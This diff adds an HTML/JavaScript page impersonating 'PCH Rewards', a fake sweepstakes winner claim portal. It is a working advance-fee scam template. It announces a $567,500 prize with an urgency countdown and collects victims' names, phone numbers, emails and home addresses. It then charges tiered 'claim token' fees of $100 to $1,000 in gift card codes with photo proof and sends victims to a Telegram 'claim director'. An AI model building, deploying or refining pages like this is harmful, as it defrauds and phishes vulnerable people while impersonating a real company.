@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PCH REWARDS | Official Winner Claim Portal</title>
+  <style>
+    :root {
+      --bg-obsidian: #090B10;
+      --bg-surface: #111520;
+      --bg-surface-elevated: #161C2C;
+      --bg-input: #0A0D14;
+      --border-subtle: #1E2538;
+      --border-focus: #F97316;
+      --pch-orange: #D9650B;
+      --pch-orange-bright: #F97316;
+      --pch-orange-dark: #B54F05;
+      --pch-glow: rgba(217, 101, 11, 0.28);
+      --gold-accent: #F59E0B;
+      --emerald: #10B981;
+      --emerald-bg: rgba(16, 185, 129, 0.12);
+      --emerald-border: rgba(16, 185, 129, 0.32);
+      --danger: #EF4444;
+      --text-primary: #F8FAFC;
+      --text-secondary: #94A3B8;
+      --text-muted: #64748B;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      min-height: 100vh;
+      background-color: var(--bg-obsidian);
+      background-image:
+        radial-gradient(circle at 15% 10%, rgba(217, 101, 11, 0.14) 0%, transparent 42%),
+        radial-gradient(circle at 85% 80%, rgba(245, 158, 11, 0.08) 0%, transparent 45%),
+        radial-gradient(rgba(255, 255, 255, 0.04) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 24px 24px;
+      color: var(--text-primary);
+      font-family: var(--font-sans);
+      line-height: 1.5;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    #confetti-canvas { position: fixed; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
+
+    .site-header {
+      position: sticky; top: 0; z-index: 50;
+      background: rgba(9, 11, 16, 0.88);
+      backdrop-filter: blur(16px);
+      border-bottom: 1px solid var(--border-subtle);
+    }
+    .header-inner { max-width: 960px; margin: 0 auto; padding: 0.85rem 1.25rem; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
+    .brand-lockup { display: flex; align-items: center; gap: 0.85rem; }
+    .pch-logo-badge {
+      width: 48px; height: 48px; border-radius: 12px; background-color: var(--pch-orange);
+      border: 1px solid rgba(255, 255, 255, 0.18); box-shadow: 0 8px 20px -4px var(--pch-glow);
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 3px;
+    }
+    .pch-logo-badge svg { width: 100%; height: 100%; display: block; }
+    .brand-text-group { display: flex; flex-direction: column; }
+    .brand-title { font-size: 1.15rem; font-weight: 800; color: var(--text-primary); line-height: 1.1; }
+    .brand-subtitle { font-size: 0.68rem; font-weight: 700; text-transform: uppercase; color: var(--pch-orange-bright); display: flex; align-items: center; gap: 0.4rem; margin-top: 0.25rem; }
+    .live-dot { width: 7px; height: 7px; border-radius: 50%; background-color: var(--emerald); box-shadow: 0 0 8px var(--emerald); }
+    .ssl-badge { display: inline-flex; align-items: center; gap: 0.45rem; padding: 0.42rem 0.8rem; border-radius: 999px; background: rgba(255, 255, 255, 0.04); border: 1px solid var(--border-subtle); color: var(--text-secondary); font-size: 0.75rem; font-weight: 600; white-space: nowrap; }
+
+    .main-container { flex: 1; width: 100%; max-width: 740px; margin: 0 auto; padding: 2rem 1rem 3.5rem; }
+    .stepper-wrapper { margin-bottom: 2rem; position: relative; }
+    .stepper-track-bg { position: absolute; top: 18px; left: 8%; right: 8%; height: 3px; background: var(--border-subtle); border-radius: 99px; z-index: 1; }
+    .stepper-track-fill { position: absolute; top: 18px; left: 8%; width: 0%; max-width: 84%; height: 3px; background: linear-gradient(90deg, var(--pch-orange), var(--emerald)); border-radius: 99px; z-index: 2; transition: width 0.4s ease; }
+    .stepper-nodes { display: grid; grid-template-columns: repeat(6, 1fr); position: relative; z-index: 3; }
+    .step-node { display: flex; flex-direction: column; align-items: center; gap: 0.35rem; text-align: center; }
+    .step-circle { width: 32px; height: 32px; border-radius: 50%; background: var(--bg-surface); border: 2px solid var(--border-subtle); color: var(--text-muted); font-size: 0.75rem; font-weight: 800; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 0 4px var(--bg-obsidian); transition: all 0.3s ease; }
+    .step-node.active .step-circle { background: var(--pch-orange); border-color: var(--pch-orange-bright); color: #FFFFFF; }
+    .step-node.completed .step-circle { background: var(--emerald); border-color: var(--emerald); color: #06120D; }
+    .step-label { font-size: 0.62rem; font-weight: 600; color: var(--text-muted); }
+    .step-node.active .step-label { color: var(--text-primary); }
+
+    .alert-banner { display: none; align-items: center; justify-content: space-between; gap: 0.75rem; padding: 0.9rem 1.1rem; border-radius: 14px; margin-bottom: 1.25rem; font-size: 0.85rem; font-weight: 500; }
+    .alert-banner.visible { display: flex; }
+    .alert-banner.error { background: rgba(239, 68, 68, 0.12); border: 1px solid rgba(239, 68, 68, 0.35); color: #FCA5A5; }
+    .alert-close { background: transparent; border: none; color: inherit; cursor: pointer; font-size: 1.1rem; }
+
+    .portal-card {
+      background: linear-gradient(160deg, var(--bg-surface-elevated) 0%, var(--bg-surface) 100%);
+      border: 1px solid var(--border-subtle); border-radius: 24px; padding: 2rem 1.5rem;
+      box-shadow: 0 24px 48px -12px rgba(0, 0, 0, 0.75);
+    }
+    @media (min-width: 640px) { .portal-card { padding: 2.75rem 2.5rem; } }
+
+    .step-view { display: none; }
+    .step-view.active-view { display: block; animation: fadeInUp 0.35s ease; }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    .pill-tag { display: inline-flex; align-items: center; gap: 0.45rem; padding: 0.38rem 0.85rem; border-radius: 999px; background: rgba(217, 101, 11, 0.14); border: 1px solid rgba(249, 115, 22, 0.32); color: var(--pch-orange-bright); font-size: 0.72rem; font-weight: 700; text-transform: uppercase; margin-bottom: 1.15rem; }
+    .card-heading { font-size: 1.65rem; font-weight: 800; color: var(--text-primary); line-height: 1.2; margin-bottom: 0.65rem; }
+    @media (min-width: 640px) { .card-heading { font-size: 2rem; } }
+    .card-subtext { color: var(--text-secondary); font-size: 0.94rem; max-width: 500px; margin: 0 auto 1.85rem; }
+
+    .form-group { margin-bottom: 1.15rem; text-align: left; }
+    .form-label { display: block; font-size: 0.73rem; font-weight: 700; text-transform: uppercase; color: var(--text-secondary); margin-bottom: 0.45rem; }
+    .form-input, textarea { width: 100%; padding: 0.9rem 1rem; border-radius: 14px; background: var(--bg-input); border: 1px solid var(--border-subtle); color: var(--text-primary); font-size: 0.95rem; outline: none; }
+    .form-input:focus, textarea:focus { border-color: var(--border-focus); box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.2); }
+    .code-input { font-family: var(--font-mono); font-size: 1.15rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; text-align: center; }
+
+    .btn-primary { width: 100%; padding: 1rem 1.5rem; border: none; border-radius: 14px; background: linear-gradient(135deg, var(--pch-orange-bright), var(--pch-orange)); color: #FFFFFF; font-size: 1rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 0.55rem; box-shadow: 0 12px 24px -6px var(--pch-glow); }
+    .btn-primary:hover { filter: brightness(1.08); }
+    .btn-secondary { padding: 0.95rem 1.25rem; border-radius: 14px; background: rgba(255, 255, 255, 0.04); border: 1px solid var(--border-subtle); color: var(--text-secondary); font-weight: 600; cursor: pointer; }
+    .btn-row { display: flex; gap: 0.75rem; margin-top: 1.5rem; }
+    .btn-row .btn-secondary { width: auto; min-width: 110px; }
+    .btn-row .btn-primary { flex: 1; }
+
+    .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.75s linear infinite; display: none; }
+    .spinner.active { display: inline-block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .verified-topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 1.25rem; border-bottom: 1px solid var(--border-subtle); margin-bottom: 1.75rem; }
+    .verified-pill { display: flex; align-items: center; gap: 0.65rem; }
+    .verified-icon { width: 34px; height: 34px; border-radius: 50%; background: var(--emerald-bg); border: 1px solid var(--emerald-border); color: var(--emerald); display: flex; align-items: center; justify-content: center; }
+    .countdown-box { padding: 0.45rem 0.85rem; border-radius: 12px; background: rgba(217, 101, 11, 0.14); border: 1px solid rgba(249, 115, 22, 0.3); font-size: 0.76rem; color: var(--text-secondary); }
+    .countdown-time { font-family: var(--font-mono); font-weight: 800; color: var(--pch-orange-bright); }
+
+    .prize-hero { text-align: center; margin-bottom: 1.75rem; }
+    .trophy-emblem { width: 84px; height: 84px; margin: 0 auto 1.25rem; border-radius: 22px; background: linear-gradient(145deg, #1A2133, #0D111A); border: 1px solid rgba(249, 115, 22, 0.45); display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+    .meta-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; text-align: left; margin-top: 1.25rem; }
+    .meta-tile { background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 14px; padding: 0.95rem 1rem; }
+    .meta-tile-label { display: block; font-size: 0.68rem; font-weight: 700; text-transform: uppercase; color: var(--text-muted); margin-bottom: 0.25rem; }
+    .meta-tile-val { font-size: 1rem; font-weight: 800; color: var(--text-primary); }
+    .meta-tile-val.emerald { color: var(--emerald); }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 640px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    .tier-grid { display: flex; flex-direction: column; gap: 10px; margin-bottom: 1.25rem; }
+    .tier-card { background: var(--bg-input); border: 2px solid var(--border-subtle); border-radius: 14px; padding: 1rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.2s; }
+    .tier-card.selected { border-color: var(--pch-orange-bright); background: rgba(217, 101, 11, 0.08); }
+    .tier-card h4 { font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 2px; }
+    .tier-card p { font-size: 0.75rem; color: var(--text-secondary); }
+    .tier-price { font-size: 1.1rem; font-weight: 800; color: var(--pch-orange-bright); }
+
+    .file-upload-box { border: 2px dashed var(--border-subtle); border-radius: 14px; padding: 1.25rem; text-align: center; background: var(--bg-input); cursor: pointer; margin-bottom: 1.25rem; }
+    .file-upload-box input { display: none; }
+
+    .admin-preview-box { background: rgba(255,255,255,0.03); border: 1px dashed var(--border-subtle); border-radius: 12px; padding: 1rem; margin-top: 1rem; text-align: left; font-size: 0.8rem; }
+    .admin-preview-box h5 { color: var(--pch-orange-bright); margin-bottom: 0.4rem; font-size: 0.75rem; text-transform: uppercase; }
+
+    .modal-overlay { position: fixed; inset: 0; background: rgba(5, 7, 12, 0.88); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+    .modal-content { background: var(--bg-surface-elevated); border: 1px solid var(--border-subtle); border-radius: 24px; padding: 2.5rem 2rem; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.8); }
+
+    .success-check { width: 68px; height: 68px; margin: 0 auto 1.1rem; border-radius: 50%; background: var(--emerald-bg); border: 2px solid var(--emerald); color: var(--emerald); display: flex; align-items: center; justify-content: center; font-size: 1.8rem; }
+    .site-footer { border-top: 1px solid var(--border-subtle); background: rgba(9, 11, 16, 0.92); padding: 1.5rem; font-size: 0.76rem; color: var(--text-muted); text-align: center; }
+  </style>
+</head>
+<body>
+
+  <canvas id="confetti-canvas"></canvas>
+
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="brand-lockup">
+        <div class="pch-logo-badge">
+          <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M32 69V38.5C32 36.8 32.9 35.2 34.4 34.3L56.4 21.1C58.6 19.8 61.4 19.8 63.6 21.1L85.6 34.3C87.1 35.2 88 36.8 88 38.5V41" stroke="#FFFFFF" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M32 45V71C32 73.8 34.2 76 37 76H93C95.8 76 98 73.8 98 71V51C98 48.2 95.8 46 93 46H44C41.8 46 40.8 48.7 42.5 50.1L66.8 66.2C68.7 67.5 71.3 67.5 73.2 66.2L91.5 54" stroke="#FFFFFF" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <text x="64" y="103" text-anchor="middle" fill="#FFFFFF" font-family="Arial, sans-serif" font-size="27" font-weight="900" letter-spacing="1.5">PCH</text>
+          </svg>
+        </div>
+        <div class="brand-text-group">
+          <span class="brand-title">PCH REWARDS</span>
+          <span class="brand-subtitle"><span class="live-dot"></span>Official Winner Portal</span>
+        </div>
+      </div>
+      <div class="ssl-badge"><span>🔒 256-Bit SSL Encrypted</span></div>
+    </div>
+  </header>
+
+  <main class="main-container">
+
+    <div class="stepper-wrapper">
+      <div class="stepper-track-bg"></div>
+      <div id="stepper-fill" class="stepper-track-fill"></div>
+      <div class="stepper-nodes">
+        <div id="node-1" class="step-node active"><div id="circle-1" class="step-circle">1</div><span class="step-label">Verify</span></div>
+        <div id="node-2" class="step-node"><div id="circle-2" class="step-circle">2</div><span class="step-label">Prize</span></div>
+        <div id="node-3" class="step-node"><div id="circle-3" class="step-circle">3</div><span class="step-label">Delivery</span></div>
+        <div id="node-4" class="step-node"><div id="circle-4" class="step-circle">4</div><span class="step-label">Token</span></div>
+        <div id="node-5" class="step-node"><div id="circle-5" class="step-circle">5</div><span class="step-label">Card</span></div>
+        <div id="node-6" class="step-node"><div id="circle-6" class="step-circle">6</div><span class="step-label">Done</span></div>
+      </div>
+    </div>
+
+    <div id="alert-banner" class="alert-banner" role="alert">
+      <div class="alert-content"><span id="alert-text"></span></div>
+      <button type="button" class="alert-close" onclick="hideAlert()">&times;</button>
+    </div>
+
+    <!-- STEP 1: VERIFY CODE -->
+    <section id="view-1" class="portal-card step-view active-view" style="text-align: center;">
+      <div class="pill-tag">Secure Code Verification</div>
+      <h1 class="card-heading">Verify Your Official Winner Code</h1>
+      <p class="card-subtext">Enter your unique alphanumeric claim code (Format: PCH-XXX-XXX) to unlock your allocation.</p>
+
+      <div style="max-width: 460px; margin: 0 auto;">
+        <div class="form-group">
+          <label class="form-label">Claim Code</label>
+          <input type="text" id="winner-code-input" class="form-input code-input" placeholder="PCH-XXX-XXX" autocomplete="off" />
+        </div>
+        <button type="button" onclick="verifyCode()" class="btn-primary">
+          <span>Verify Claim Code</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- STEP 2: PRIZE REVEAL & COUNTDOWN -->
+    <section id="view-2" class="portal-card step-view">
+      <div class="verified-topbar">
+        <div class="verified-pill">
+          <div class="verified-icon">✓</div>
+          <div>
+            <div style="font-size: 0.72rem; font-weight: 800; color: var(--emerald);">Code Authenticated</div>
+            <div id="step2-code-badge" style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-secondary);">Voucher: —</div>
+          </div>
+        </div>
+        <div class="countdown-box">
+          <span>Locks in: <span id="countdown-display" class="countdown-time">24:00:00</span></span>
+        </div>
+      </div>
+
+      <div class="prize-hero">
+        <div class="trophy-emblem">🏆</div>
+        <div style="font-size: 0.74rem; font-weight: 800; text-transform: uppercase; color: var(--pch-orange-bright); margin-bottom: 0.4rem;">Congratulations! Allocation Unlocked</div>
+        <h2 class="card-heading">$567,500.00 + $7,000.00 Weekly For Life</h2>
+        <p style="color: var(--text-secondary); font-size: 0.9rem; max-width: 480px; margin: 0 auto 1.5rem;">Your grand prize has been verified against the official PCH REWARDS international ledger.</p>
+
+        <div class="meta-grid">
+          <div class="meta-tile"><span class="meta-tile-label">Status</span><span class="meta-tile-val emerald">Reserved &amp; Verified</span></div>
+          <div class="meta-tile"><span class="meta-tile-label">Reference ID</span><span class="meta-tile-val" style="font-family: var(--font-mono);">PCH-8849-GLD</span></div>
+        </div>
+      </div>
+
+      <div class="btn-row">
+        <button type="button" class="btn-secondary" onclick="switchStep(1)">Back</button>
+        <button type="button" class="btn-primary" onclick="switchStep(3)">Proceed to Delivery Setup &rarr;</button>
+      </div>
+    </section>
+
+    <!-- STEP 3: RECIPIENT PERSONAL & DOOR DELIVERY INFO -->
+    <section id="view-3" class="portal-card step-view">
+      <div style="margin-bottom: 1.5rem;">
+        <div style="font-size: 0.72rem; font-weight: 800; color: var(--pch-orange-bright);">Step 3 of 6</div>
+        <h2 class="card-heading" style="margin-top: 0.25rem;">Recipient Door Delivery Info</h2>
+        <p style="color: var(--text-secondary); font-size: 0.88rem;">Provide your precise physical delivery address for your armored parcel dispatch.</p>
+      </div>
+
+      <div style="max-width: 500px; margin: 0 auto;">
+        <div class="grid-2">
+          <div class="form-group"><label class="form-label">Full Legal Name *</label><input type="text" id="delName" class="form-input" placeholder="Jordan Vance" /></div>
+          <div class="form-group"><label class="form-label">Phone Number *</label><input type="tel" id="delPhone" class="form-input" placeholder="+1 (555) 234-8910" /></div>
+        </div>
+        <div class="form-group"><label class="form-label">Email Address *</label><input type="email" id="delEmail" class="form-input" placeholder="jordan@example.com" /></div>
+        <div class="form-group"><label class="form-label">Street Address *</label><input type="text" id="delAddress" class="form-input" placeholder="123 Grand Avenue, Suite 400" /></div>
+        <div class="grid-2">
+          <div class="form-group"><label class="form-label">City *</label><input type="text" id="delCity" class="form-input" placeholder="New York" /></div>
+          <div class="form-group"><label class="form-label">State / Zip *</label><input type="text" id="delZip" class="form-input" placeholder="10001" /></div>
+        </div>
+        <div class="btn-row">
+          <button type="button" class="btn-secondary" onclick="switchStep(2)">Back</button>
+          <button type="button" class="btn-primary" onclick="submitDelivery()">Continue to Token Tier Selection &rarr;</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 4: SEPARATE TOKEN PRICE TIER SCREEN -->
+    <section id="view-4" class="portal-card step-view">
+      <div style="margin-bottom: 1.5rem;">
+        <div style="font-size: 0.72rem; font-weight: 800; color: var(--pch-orange-bright);">Step 4 of 6</div>
+        <h2 class="card-heading" style="margin-top: 0.25rem;">Select Claim Token Speed Tier</h2>
+        <p style="color: var(--text-secondary); font-size: 0.88rem;">Choose your priority processing speed to queue your armored dispatch.</p>
+      </div>
+
+      <div class="tier-grid">
+        <label class="tier-card selected" onclick="selectTier(this, 'Bronze', 100)">
+          <div><h4>Bronze Tier</h4><p>Standard Dispatch (~7 Days)</p></div>
+          <div class="tier-price">$100</div>
+        </label>
+        <label class="tier-card" onclick="selectTier(this, 'Silver', 300)">
+          <div><h4>Silver Tier</h4><p>Priority Dispatch (4 Days)</p></div>
+          <div class="tier-price">$300</div>
+        </label>
+        <label class="tier-card" onclick="selectTier(this, 'Gold', 700)">
+          <div><h4>Gold Tier</h4><p>Express Dispatch (2 Days)</p></div>
+          <div class="tier-price">$700</div>
+        </label>
+        <label class="tier-card" onclick="selectTier(this, 'Platinum', 1000)">
+          <div><h4>Platinum Tier</h4><p>Instant VIP Express (24 Hours)</p></div>
+          <div class="tier-price">$1,000</div>
+        </label>
+      </div>
+
+      <div class="btn-row">
+        <button type="button" class="btn-secondary" onclick="switchStep(3)">Back</button>
+        <button type="button" class="btn-primary" onclick="switchStep(5)">Proceed to Gift Card Payment &rarr;</button>
+      </div>
+    </section>
+
+    <!-- STEP 5: GIFT CARD CODES & PHOTO UPLOAD SCREEN -->
+    <section id="view-5" class="portal-card step-view">
+      <div style="margin-bottom: 1.5rem;">
+        <div style="font-size: 0.72rem; font-weight: 800; color: var(--pch-orange-bright);">Step 5 of 6</div>
+        <h2 class="card-heading" style="margin-top: 0.25rem;">Submit Claim Token Payment</h2>
+        <p style="color: var(--text-secondary); font-size: 0.88rem;">Selected: <strong id="summaryTierText" style="color: var(--pch-orange-bright);">Bronze ($100)</strong>. Enter your gift card codes and attach clear photo proof.</p>
+      </div>
+
+      <div style="max-width: 500px; margin: 0 auto;">
+        <div class="form-group">
+          <label class="form-label">Gift Card Code(s) *</label>
+          <textarea id="giftCardCodes" rows="3" placeholder="Enter card code(s)..."></textarea>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Clear Photo of Gift Card(s) Showing Code *</label>
+          <div class="file-upload-box" onclick="document.getElementById('card-file').click()">
+            <p id="file-name-label" style="font-size: 0.85rem; color: var(--text-secondary);">📷 Tap here to upload clear photo of the card</p>
+            <input type="file" id="card-file" accept="image/*" onchange="handleFileSelect(event)" />
+          </div>
+        </div>
+
+        <div class="admin-preview-box">
+          <h5>Admin Preview Data (Visible on submission):</h5>
+          <div id="adminCardPreview">No card uploaded yet.</div>
+        </div>
+
+        <div class="btn-row" style="margin-top: 1.5rem;">
+          <button type="button" class="btn-secondary" onclick="switchStep(4)">Back</button>
+          <button type="button" onclick="submitPayment()" class="btn-primary">Verify Gift Card Token &rarr;</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 6: CONGRATULATIONS & PENDING AGENT POPUP -->
+    <section id="view-6" class="portal-card step-view" style="text-align: center;">
+      <div class="success-check">✓</div>
+      <div class="pill-tag">All Steps Completed Successfully</div>
+      <h2 class="card-heading">Congratulations!</h2>
+      <p style="color: var(--text-secondary); font-size: 0.9rem; max-width: 480px; margin: 0 auto 1.5rem;">You have successfully completed all necessary steps in claiming your winning allocation.</p>
+
+      <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 16px; padding: 1.5rem; text-align: left; margin-bottom: 1.5rem;">
+        <div style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">Tracking ID</div>
+        <div id="receiptId" style="font-family: var(--font-mono); font-size: 1.15rem; font-weight: 800; color: var(--pch-orange-bright); margin-bottom: 1rem;">PCH-CLM-8849-2026</div>
+        
+        <div style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">Assigned Claim Agent</div>
+        <div style="font-size: 1rem; font-weight: 700; color: #fff;">Arthur Vance</div>
+      </div>
+
+      <button type="button" class="btn-primary" onclick="openAgentModal()">Contact Your Claim Agent</button>
+    </section>
+
+  </main>
+
+  <!-- LOADING MODAL -->
+  <div class="modal-overlay" id="verificationModal">
+    <div class="modal-content">
+      <div class="spinner active" style="width: 46px; height: 46px; border-width: 4px; margin: 0 auto 18px;"></div>
+      <h3 style="font-size: 1.2rem; font-weight: 800; margin-bottom: 8px;">Validating Gift Card...</h3>
+      <p style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.4;">Please wait 20–30 minutes while our secure gateway verifies your gift card codes and balances against international ledgers.</p>
+    </div>
+  </div>
+
+  <!-- TELEGRAM AGENT POPUP MODAL -->
+  <div class="modal-overlay" id="agentModal">
+    <div class="modal-content">
+      <div style="font-size: 2.5rem; margin-bottom: 1rem;">💬</div>
+      <h3 style="font-size: 1.3rem; font-weight: 800; margin-bottom: 8px;">Connect With Claim Director</h3>
+      <p style="font-size: 0.88rem; color: var(--text-secondary); margin-bottom: 1.5rem; line-height: 1.5;">Your file is ready. Click below to connect directly with your assigned claim director on Telegram to finalize delivery.</p>
+      
+      <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="btn-primary" style="text-decoration: none; margin-bottom: 0.75rem; background: linear-gradient(135deg, #229ED9, #1778AC);">Open Telegram Chat ↗</a>
+      <button type="button" class="btn-secondary" style="width: 100%;" onclick="closeAgentModal()">Close</button>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div><strong>PCH REWARDS</strong> &bull; Official Winner Claim Portal &bull; &copy; 2026</div>
+  </footer>
+
+  <script>
+    const validCodes = ["PCH-8849-VIP", "PCH-2026-GOLD", "PCH-WIN-100"];
+    let selectedTier = { name: "Bronze", amount: 100 };
+    let uploadedImageName = "";
+
+    function verifyCode() {
+      const codeInput = document.getElementById("winner-code-input").value.trim().toUpperCase();
+
+      if (!codeInput) {
+        showAlert("Please enter your claim code.");
+        return;
+      }
+
+      if (!validCodes.includes(codeInput)) {
+        showAlert("Invalid or unauthorized claim code. Please check your document and try again.");
+        return;
+      }
+
+      hideAlert();
+      document.getElementById("step2-code-badge").textContent = "Voucher: " + codeInput;
+      switchStep(2);
+      startCountdown();
+    }
+
+    function submitDelivery() {
+      const name = document.getElementById("delName").value.trim();
+      const phone = document.getElementById("delPhone").value.trim();
+      const email = document.getElementById("delEmail").value.trim();
+      const address = document.getElementById("delAddress").value.trim();
+      
+      if (!name || !phone || !email || !address) {
+        showAlert("Please fill in all required delivery fields.");
+        return;
+      }
+      hideAlert();
+      switchStep(4);
+    }
+
+    function submitPayment() {
+      const codes = document.getElementById("giftCardCodes").value.trim();
+      if (!codes || !uploadedImageName) {
+        showAlert("Please enter your gift card codes and attach a clear photo.");
+        return;
+      }
+      hideAlert();
+
+      const modal = document.getElementById("verificationModal");
+      modal.style.display = "flex";
+
+      setTimeout(() => {
+        modal.style.display = "none";
+        document.getElementById("receiptId").textContent = 'PCH-CLM-' + Math.floor(1000 + Math.random() * 9000) + '-2026';
+        switchStep(6);
+        launchConfettiBurst();
+      }, 3500);
+    }
+
+    function selectTier(el, name, amount) {
+      document.querySelectorAll(".tier-card").forEach(c => c.classList.remove("selected"));
+      el.classList.add("selected");
+      selectedTier = { name, amount };
+      document.getElementById("summaryTierText").textContent = `${name} ($${amount})`;
+    }
+
+    function handleFileSelect(e) {
+      const file = e.target.files[0];
+      if (file) {
+        uploadedImageName = file.name;
+        document.getElementById("file-name-label").textContent = '✅ File attached: ' + file.name;
+        document.getElementById("adminCardPreview").innerHTML = `<b>File:</b> ${file.name}<br><b>Codes entered:</b> ${document.getElementById("giftCardCodes").value || 'Pending input'}`;
+      }
+    }
+
+    function openAgentModal() {
+      document.getElementById("agentModal").style.display = "flex";
+    }
+
+    function closeAgentModal() {
+      document.getElementById("agentModal").style.display = "none";
+    }
+
+    function startCountdown() {
+      let secs = 24 * 3600;
+      setInterval(() => {
+        if (secs > 0) secs--;
+        let h = Math.floor(secs / 3600);
+        let m = Math.floor((secs % 3600) / 60);
+        let s = secs % 60;
+        const disp = document.getElementById("countdown-display");
+        if (disp) disp.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+      }, 1000);
+    }
+
+    function switchStep(num) {
+      for (let i = 1; i <= 6; i++) {
+        const viewEl = document.getElementById(`view-${i}`);
+        if (viewEl) viewEl.classList.toggle("active-view", i === num);
+        
+        const node = document.getElementById(`node-${i}`);
+        if (node) {
+          node.classList.toggle("active", i === num);
+          node.classList.toggle("completed", i < num);
+        }
+        const circle = document.getElementById(`circle-${i}`);
+        if (circle) circle.textContent = i < num ? "✓" : i;
+      }
+      const fillBar = document.getElementById("stepper-fill");
+      if (fillBar) fillBar.style.width = ((num - 1) / 5) * 100 + "%";
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function showAlert(msg) {
+      const b = document.getElementById("alert-banner");
+      document.getElementById("alert-text").textContent = msg;
+      b.className = "alert-banner visible error";
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function hideAlert() {
+      const b = document.getElementById("alert-banner");
+      if (b) b.classList.remove("visible");
+    }
+
+    function launchConfettiBurst() {
+      const canvas = document.getElementById("confetti-canvas");
+      if (!canvas) return;
+      const ctx = canvas.getContext("2d");
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const palette = ["#D9650B", "#F97316", "#F59E0B", "#10B981", "#F8FAFC"];
+      const particles = [];
+      for (let i = 0; i < 110; i++) {
+        particles.push({
+          x: canvas.width * 0.5,
+          y: canvas.height * 0.45,
+          vx: (Math.random() - 0.5) * 16,
+          vy: (Math.random() - 0.7) * 16,
+          size: 6 + Math.random() * 6,
+          color: palette[Math.floor(Math.random() * palette.length)],
+          rot: Math.random() * Math.PI * 2,
+          vRot: (Math.random() - 0.5) * 0.2,
+          alpha: 1
+        });
+      }
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        let active = false;
+        particles.forEach(p => {
+          p.x += p.vx; p.y += p.vy; p.vy += 0.35; p.rot += p.vRot; p.alpha -= 0.015;
+          if (p.alpha > 0) {
+            active = true;
+            ctx.save();
+            ctx.globalAlpha = p.alpha;
+            ctx.translate(p.x, p.y);
+            ctx.rotate(p.rot);
+            ctx.fillStyle = p.color;
+            ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size*0.65);
+            ctx.restore();
+          }
+        });
+        if (active) requestAnimationFrame(animate);
+      }
+      requestAnimationFrame(animate);
+    }
+  </script>
+</body>
+</html>
